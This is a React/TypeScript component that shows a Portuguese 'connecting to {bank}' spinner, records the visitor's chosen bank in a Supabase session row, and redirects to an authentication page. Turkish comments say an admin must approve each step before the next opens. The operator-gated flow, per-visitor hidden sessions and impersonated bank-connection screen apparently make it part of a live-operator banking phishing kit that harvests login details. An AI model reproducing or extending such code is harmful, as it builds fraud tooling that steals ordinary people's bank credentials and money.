"use client";

import { useEffect } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";

type Props = {
  sessionId: string;
  bankSlug: string;
  bankName: string;
};

export function AutenticacaoRedirect({ sessionId, bankSlug, bankName }: Props) {
  const supabase = createBrowserSupabaseClient();

  useEffect(() => {
    let mounted = true;

    async function doRedirect() {
      if (!supabase || !sessionId) return;

      if (sessionId === "preview") return;

      const { data: existing } = await supabase.from("sessions").select("form_data, public_id").eq("id", sessionId).maybeSingle();
      const prev = (existing?.form_data ?? {}) as Record<string, unknown>;

      await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "autenticacao",
          form_data: {
            ...prev,
            bankSlug,
            bankName,
            // Bankadan giris = adim 1. approvalStatus sadece admin "Autenticação"
            // onayi gonderince "autenticacao" olur (o zaman adim 2 acilir).
            approvalStatus: "",
          },
        })
        .eq("id", sessionId);

      if (mounted) {
        const routeSid = existing?.public_id != null ? String(existing.public_id) : sessionId;
        window.location.replace(`/autenticacao?session=${encodeURIComponent(routeSid)}`);
      }
    }

    void doRedirect();

    return () => {
      mounted = false;
    };
  }, [sessionId, bankSlug, bankName, supabase]);

  return (
    <div className="min-h-screen bg-[#F5F5F5] flex items-center justify-center">
      <div className="text-center">
        <div className="w-12 h-12 border-4 border-[#003399] border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
        <p className="text-gray-600 font-medium">A ligar a {bankName}...</p>
      </div>
    </div>
  );
}
